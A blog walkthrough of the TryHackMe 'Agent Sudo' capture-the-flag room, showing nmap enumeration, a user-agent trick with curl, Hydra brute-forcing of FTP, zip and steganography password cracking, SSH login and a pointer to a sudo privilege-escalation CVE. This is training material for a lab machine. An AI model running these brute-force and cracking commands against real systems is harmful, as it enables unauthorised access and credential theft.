---
title: TryHackMe Agent Sudo
date: 2021-07-24T16:50:32+05:30
lastmod: 2021-07-24T16:50:32+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
cover:
  image: /img/thm.gif
  alt: "cover image"

categories:
  - TryHackMe
tags:
  - tryhackme
  - rooms
  - thm
  - Agent Sudo

draft: false
description: TryHackMe Room Agent Sudo, You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.

---

## OverView

|||
|:---:|:---:|
| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|Agent Sudo|![logo](https://tryhackme-images.s3.amazonaws.com/room-icons/aedc6b66c222e15ff740c282a0c3f44e.png)|
| _Room [Subscription Required]_| [Agent Sudo]()|

---

## Task 01: Author note

n/a

## Task 02:Enumerate

- nmap

     ```bash
     sudo nmap -sC -sV -oN init 10.10.245.114

     Starting Nmap 7.60 ( https://nmap.org ) at 2021-07-25 19:49 BST
     Nmap scan report for ip-10-10-245-114.eu-west-1.compute.internal (10.10.245.114)
     Host is up (0.020s latency).
     Not shown: 921 closed ports, 76 filtered ports
     PORT   STATE SERVICE VERSION
     21/tcp open  ftp     vsftpd 3.0.3
     22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
     | ssh-hostkey: 
     |   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
     |   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
     |_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (EdDSA)
     80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
     |_http-server-header: Apache/2.4.29 (Ubuntu)
     |_http-title: Annoucement
     MAC Address: 02:C4:A2:7C:B0:5B (Unknown)
     Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

     Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     Nmap done: 1 IP address (1 host up) scanned in 13.23 seconds
     ```

### 2.1 How many open ports?

ans: `3`

### 2.2 How you redirect yourself to a secret page?

ans: `user-agent`

### 2.3 What is the agent name?

- run `CURL` to find out
  `curl -H user-agent:C http://10.10.245.114/agent_C_attention.php`

---
<!-- Google Ads -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->

---

## Task 03: Hash cracking and brute-force

> Done enumerate the machine? Time to brute your way out.

### 3.1: FTP password

- running `Hydra`

     ```bash
     hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.245.114 -t 4 ftp
     Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

     Hydra (http://www.thc.org/thc-hydra) starting at 2021-07-25 19:57:23
     [DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
     [DATA] attacking ftp://10.10.245.114:21/

     ...[snip]...
     [21][ftp] host: 10.10.245.114   login: chris   password: [*******]
     1 of 1 target successfully completed, 1 valid password found
     Hydra (http://www.thc.org/thc-hydra) finished at 2021-07-25 20:01:09

     ...[snip]...
     ```

### 3.2 Zip file password

- download all files from `ftp`

     ```bash
     ftp 10.10.245.114 
     Connected to 10.10.245.114.
     220 (vsFTPd 3.0.3)
     Name (10.10.245.114:root): chris
     331 Please specify the password.
     Password:
     230 Login successful.
     Remote system type is UNIX.
     Using binary mode to transfer files.
     ftp> dir
     200 PORT command successful. Consider using PASV.
     150 Here comes the directory listing.
     -rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
     -rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
     -rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png

     ftp> mget -r *
     ```

- read the `To_agentJ.txt` file.

     ```cat
     cat To_agentJ.txt
     Dear agent J,

     All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

     From,
     Agent C
     ```

- It says that the login password is in the fake pic's. This clearly indicates to use of Steganography. using steghide we see that we need a passphrase to extract info from `cute-alien.jpg` , this password must be hidden in `cutie.png` . we use binwalk for this.

     ```bash
     binwalk -e cutie.png 

     DECIMAL       HEXADECIMAL     DESCRIPTION
     --------------------------------------------------------------------------------
     0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
     869           0x365           Zlib compressed data, best compression
     34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
     34820         0x8804          End of Zip archive
     ```

- Zip2John

     ```bash

     #1 get the Crackable Hash
     zip2john 8702.zip  > zip_hash

     #2: crack the Hash

     john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash 
     Warning: detected hash type "ZIP", but the string is also recognized as "ZIP-opencl"
     Use the "--format=ZIP-opencl" option to force loading these as that type instead
     Using default input encoding: UTF-8
     Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
     Will run 2 OpenMP threads
     Press 'q' or Ctrl-C to abort, almost any other key for status
     [*****]            (8702.zip/To_agentR.txt)
     1g 0:00:00:00 DONE (2021-07-25 20:14) 1.333g/s 32768p/s 32768c/s 32768C/s merlina..280690
     Use the "--show" option to display all of the cracked passwords reliably
     Session completed.
     ```

#### 3.3 steg password

- steps
  
     ```bash

     #1 unzip the `zip`


     # read the content
     Agent C,

     We need to send the picture to 'QXJlYTUx' as soon as possible!

     By,
     Agent R

     #3 flag

     echo QXJlYTUx | bas364 -d
     ```

### 3.4 Who is the other agent (in full name)?

### 3.5 SSH password

- read the `encoded image`
  
     ```bash
     steghide extract -sf cute-alien.jpg
     Enter passphrase: 
     wrote extracted data to "message.txt".
     ```

- after extraction you'll get this message:
  
     ```bash
     cat message.txt 
     Hi [username-was-here],

     Glad you find this message. Your login password is [password-was-here]

     Don't ask me why the password look cheesy, ask agent R who set this password for you.

     Your buddy,
     chris
     ```

---
<!-- Google Ads -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->

---

## Task 04: Capture the user flag

- getinto the box using the creds.
  
     ```ssh
     ssh james@10.10.245.114
     james@10.10.245.114's password: 
     Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)
     ```

### 4.1 What is the user flag?

- read the file
  
  ![img](https://i.imgur.com/xY5vy2l.png)

### 4.2 What is the incident of the photo called?

- copy photo to local machine

     ```bash
     scp james@10.10.245.114:Alien_autospy.jpg .
     ```

- do a reverse image search with the image
  
  ![img](https://i.imgur.com/2wasC3q.png)

- Hint [link](https://www.foxnews.com/science/filmmaker-reveals-how-he-faked-infamous-roswell-alien-autopsy-footage-in-a-london-apartment)

---
<!-- Google Ads -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->

---

## Task 05: Privilege escalation

### 5.1 CVE number for the escalation (Format: CVE-xxxx-xxxx)

- check for SUDO version & search for the SSH Version

     ```bash
     james@agent-sudo:~$ sudo -l
     [sudo] password for james: 
     Matching Defaults entries for james on agent-sudo:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

     User james may run the following commands on agent-sudo:
     (ALL, !root) /bin/bash
     ```

- vulnerable `sudo` version CVE
  
     ```bash
     #find Sudo version
     james@agent-sudo:~$ sudo -V
     Sudo version 1.8.21p2
     Sudoers policy plugin version 1.8.21p2
     Sudoers file grammar version 46
     Sudoers I/O plugin version 1.8.21p2
     ```
  
- Hint: [link](https://www.exploit-db.com/exploits/47502)

### 5.3 [Root] the box

- run the Exploit

- being root read the file

     ```bash
     cat /root/root.txt 
     To Mr.hacker,

     Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

     Your flag is 
     [flag-was-here]

     By,
     [agent-R-real-name] a.k.a Agent R
     ```

---
<!-- Google Ads -->

<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->


<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="anir0y" data-description="Support me on Buy me a coffee!" data-message="" data-color="#5F7FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

<!-- EOF -->
